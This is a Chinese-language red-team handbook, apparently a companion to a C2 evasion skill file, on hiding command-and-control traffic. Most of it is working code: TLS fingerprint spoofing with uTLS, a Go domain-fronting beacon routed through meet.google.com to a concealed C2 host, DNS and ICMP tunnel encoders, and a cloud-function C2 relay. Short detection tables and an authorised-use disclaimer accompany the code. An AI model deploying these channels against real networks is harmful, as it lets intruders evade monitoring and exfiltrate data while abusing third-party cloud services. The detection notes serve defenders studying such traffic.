# 协议层免杀（PROTOCOL_EVASION）

> 本文件为 `c2-custom-evasion.md` 技能文件索引的伴生手册（补齐断链），并承担 **P0-7「C2 流量特征消除工程」**
> 与 P1 的 TLS 指纹（JA4）、DNS/ICMP 隧道、域前置高信誉域细节。
> 覆盖 **TLS 指纹伪造（uTLS/ja3transport/JA4）→ 域前置（Google Meet/YouTube/GCP）→ DNS 隧道 → 云 API 滥用 → 检测侧（NDR/JA3 基线）→ 实测判据**。
> 授权立场见 `refs/README.md`；外部来源见审计报告 §5（JA4 指南、uTLS go-bypasser、域前置 cryptika 研究）。

## 1. TLS 指纹伪造（JA3 / JA4 / uTLS）

### 1.1 指纹原理

```
JA3 = MD5( TLS 版本 + 密码套件列表 + 扩展列表 + 椭圆曲线 + 曲线格式 )
JA4 = 更细粒度（含 QUIC、HTTP/2、扩展顺序与值），抗 JA3 的 hash 碰撞
```

### 1.2 uTLS 伪造（Go）

```go
// 用 uTLS 伪造浏览器 ClientHello，使 JA3/JA4 匹配 Chrome/Firefox
import tls "github.com/refraction-networking/utls"

conn, err := tls.UClient(rawConn, &tls.Config{ServerName: host}, tls.HelloChrome_Auto)
// HelloChrome_Auto 自动匹配最新 Chrome 指纹
// 其他 profile：HelloFirefox_Auto / HelloIOS_Auto / HelloRandomized
```

### 1.3 ja3transport（透明代理伪造）

```go
// ja3transport 包装 http.Transport，自动替换 ClientHello 指纹
import "github.com/CUCyber/ja3transport"
tr, _ := ja3transport.NewTransport(ja3transport.WithJA3(ja3, ja3s))
client := &http.Client{Transport: tr}
```

### 1.4 go-bypasser / tls-client 思路

- **go-bypasser**（审计 §5）：动态生成多浏览器/多设备指纹，绕过基于 JA3 的封禁。
- **tls-client**：预置 Chrome/Firefox/Safari 等多 profile，API 与 net/http 兼容。
- 思路共性：**不只是 ClientHello，还要伪造 HTTP/2 帧序、扩展顺序、ALPN、SNI 行为**，使 Akamai 等被动指纹也一致。

### 1.5 JA4/JA4+ 伪造要点

| 维度 | JA3 只看 | JA4 增加 |
|---|---|---|
| 版本/套件 | ✓ | ✓ |
| 扩展顺序/值 | 顺序 | 具体值 + QUIC |
| HTTP/2 | ✗ | 帧序/优先级 |
| SNI/ALPN | 部分 | 完整 |

**伪造**：必须让「TLS ClientHello + HTTP/2 SETTINGS 帧序 + ALPN」整体匹配目标浏览器，单改 ClientHello 会被 JA4 识破。

---

## 2. 域前置（Domain Fronting）

### 2.1 原理

```
SNI（TLS 外层）→ 高信誉前端域（CDN 接受的）
Host（HTTP 内层）→ 真实 C2 域名
CDN 按 Host 转发，IDS 只看 SNI 看不到真实目标
```

**关键**：TLS SNI 与 HTTP Host 分离；CDN 接受任意 Host 时才可行。

### 2.2 高信誉前端域（Google Meet/YouTube/GCP 变体，审计 §5）

| 前端域 | 用途 | 说明 |
|---|---|---|
| `accounts.google.com` | Google 账号域 | 高信誉 CDN 前置 |
| `meet.google.com` | Google Meet | cryptika 研究变体 |
| `www.youtube.com` | YouTube | 高信誉前端 |
| `www.gstatic.com` | Google 静态 | 前置 + 缓存 |
| `*.cloudfunctions.net` / `*.run.app` | GCP 云函数 | 云 API 滥用型前置 |

**实现**（curl 思路，工程代码用带 SNI/Host 分离的 TLS 客户端）：

```go
// SNI 与 Host 分离（完整实现：tls.Config.ServerName 控制 SNI，http.Request.Host 控制 HTTP 层）
package main

import (
    "crypto/tls"
    "net"
    "net/http"
    "time"
)

func frontRequest(c2Host string, body []byte) (*http.Response, error) {
    dialer := &net.Dialer{Timeout: 10 * time.Second}
    // 连接层拨前端域（CDN 边缘）；TLS 握手 SNI = 前端域
    conn, err := tls.DialWithDialer(dialer, "tcp", "meet.google.com:443",
        &tls.Config{ServerName: "meet.google.com", MinVersion: tls.VersionTLS12})
    if err != nil {
        return nil, err
    }
    // HTTP 层 Host = 真实 C2 域名；CDN 按 Host 转发到源站，IDS 在 SNI 层只见前端域
    req, _ := http.NewRequest("POST", "https://"+c2Host+"/api/beacon", nil)
    req.Host = c2Host
    // 前提：CDN（前端域）接受任意 Host 转发（自建 CDN 配置或开放型云前端）
    client := &http.Client{Transport: &http.Transport{DialTLS: func(_, _ string) (net.Conn, error) { return conn, nil }}}
    return client.Do(req)
}
```

### 2.3 检测侧：SNI/Host 不一致

| 判据 | 方法 |
|---|---|
| SNI ≠ Host | NDR 解析 TLS SNI 与 HTTP Host 比对 |
| 前端域异常 | 高信誉域（Google/YouTube）承载非其业务的 Host |

---

## 3. DNS 隧道（载荷编码）

### 3.1 原理

```
Beacon → DNS 查询（子域编码 payload）→ 权威 DNS → C2 解析 → 响应编码在 TXT/CNAME
```

### 3.2 载荷编码

```python
# 完整实现：payload 编码进 DNS 查询子域 + TXT 响应解析（base32 子域安全，去填充）
import base64, struct

def encode_query(data: bytes, zone: str = 'tun.example.com') -> str:
    """payload → DNS 查询名：chunk 头带序号/总数，防单查询超限"""
    enc = base64.b32encode(data).decode().lower().rstrip('=')
    labels = [enc[i:i+63] for i in range(0, len(enc), 63)]       # 每标签 ≤63
    if len(labels) == 1:
        return f'{labels[0]}.{zone}'
    out = []
    for i, lbl in enumerate(labels):
        # 首标签加 2 字节 chunk 序号（hex 编码入子域）：i/total
        out.append(f'{i:x}{len(labels):x}{lbl}.{zone}')
    return out[0]  # 分段场景按序逐条查询

def decode_txt_response(records: list[str]) -> bytes:
    """TXT 响应还原：去非 base32 字符 → 补填充 → 解码"""
    s = ''.join(r for r in records if r.isalnum() or r.isalpha())
    pad = '=' * ((8 - len(s) % 8) % 8)
    return base64.b32decode(s.upper() + pad)

# C2 侧（权威 NS 运行）：查询名解析 + 结果进 TXT
def handle_dns(qname: str, result: bytes) -> str:
    assert qname.endswith('.tun.example.com')
    body = qname.split('.')[0]
    return base64.b32encode(result).decode().lower().rstrip('=')
```

### 3.3 检测侧：DNS 熵/频率基线

| 判据 | 方法 |
|---|---|
| 子域高熵 | DNS 查询子域长度 + 熵异常（正常域短、低熵） |
| 查询频率 | 固定间隔（beacon 节拍）查询 + TXT 记录异常 |
| 单域高度 | 大量查询集中在单一权威域 |

---

## 4. ICMP 隧道

```python
# 完整实现：ICMP Echo 载荷隧道（scapy 构造；请求 data=载荷块，响应 data=回传块）
# 块头：2B 序号 + 2B 总数 + 1B 类型(0=数据/1=结束) + 载荷
from scapy.all import IP, ICMP, sr1

CHUNK = 1024  # 数据段单块上限（正常 ping 载荷 ~32B，越小越不显眼，按需调）

def icmp_send(host: str, payload: bytes) -> bytes:
    chunks = [payload[i:i+CHUNK] for i in range(0, len(payload), CHUNK)]
    total = len(chunks)
    reply_data = b''
    for i, ch in enumerate(chunks):
        body = i.to_bytes(2, 'big') + total.to_bytes(2, 'big') + (1 if i == total-1 else 0).to_bytes(1, 'big') + ch
        resp = sr1(IP(dst=host) / ICMP(type=8) / body, timeout=5, verbose=0)
        if resp and resp.haslayer(ICMP):
            reply_data += bytes(resp[ICMP].payload)
    return reply_data

# 服务端（C2）侧：监听 ICMP Echo，抽 data 还原请求，Echo Reply 携带响应块
# 检测侧：ICMP 体积（>100B 常规上限）、频率（beacon 节拍）、数据段熵异常
```

**检测侧**：ICMP payload 体积异常（正常 ping 固定小载荷）、频率异常、数据段高熵。

---

## 5. 云 API 滥用（Cloud API Abuse）

### 5.1 云函数代理

```python
# 完整实现：GCP Cloud Functions / AWS Lambda 作为 C2 中继（目标只见云厂商域名与证书）
# 1) C2 真实域名经云函数转发；TLS 证书为云厂商签发（*.cloudfunctions.net / *.lambda-url.*）
# 2) 中继带 token 校验与固定响应壳（业务化伪装），流量形态接近正常 API
import os, json, urllib.request

REAL_C2 = os.environ.get('REAL_C2')          # 真实 C2 源站（中继配置侧）
TOKEN   = os.environ.get('RELAY_TOKEN')      # 共享令牌（beacon 与中继约定）

def relay(request):
    # 校验 token：请求头或 URL 参数（失败按业务 404 语义静默）
    tok = request.headers.get('X-Beacon-Token') or request.args.get('t', '')
    if tok != TOKEN:
        return {'code': 404, 'body': '{"error":"not_found"}'}
    # 转发：方法/头/体原样透传真实 C2（URL 路径由中继固定，目标侧零 C2 域名特征）
    req = urllib.request.Request(REAL_C2 + '/poll',
        data=request.get_data(), method='POST',
        headers={'Content-Type': 'application/octet-stream'})
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            return {'code': 200, 'body': r.read()}
    except Exception:
        return {'code': 503, 'body': '{"error":"upstream"}'}

# 各平台入口壳（GCP 函数 / AWS Lambda 同理换 handler 签名）：
#   GCP:  def handler(request): return json.dumps(relay(request))
#   AWS:  def lambda_handler(event, ctx): return relay(适配后的 request 对象)
# 检测侧：云厂商域名承载非业务流量 + 固定 token 模式 + 频率异常（见 5.2 表）
```

### 5.2 检测侧

| 判据 | 方法 |
|---|---|
| 云函数域名异常 | 云厂商域名承载非业务流量 + 频率异常 |
| token 模式 | 请求体固定 token + 加密 blob |

---

## 6. 检测侧总表（回馈 attack-defense）

| 技术 | 检测点 | 判据 |
|---|---|---|
| TLS 指纹伪造 | NDR 被动 JA3/JA4 | 指纹偏离浏览器基线（需整体匹配，含 HTTP/2） |
| 域前置 | SNI/Host 分离 | SNI ≠ Host + 高信誉域异常 |
| DNS 隧道 | 子域熵/频率 | 高熵子域 + 固定节拍 + TXT 异常 |
| ICMP 隧道 | ICMP 体积/频率 | 大载荷 + 高熵 + 频率异常 |
| 云 API 滥用 | 云域名流量 | 非业务流量 + token 模式 |

## 7. 实测判据

| 判据 | 方法 |
|---|---|
| JA3/JA4 是否匹配浏览器 | NDR 工具（zeek/JA4 指南）比对目标 profile |
| 域前置是否生效 | 抓包确认 SNI 与 Host 分离且 CDN 转发成功 |
| 隧道是否被识别 | DNS/ICMP 流量熵 + 频率基线比对 |

*WARNING: 授权红队评估与安全研究专用。*
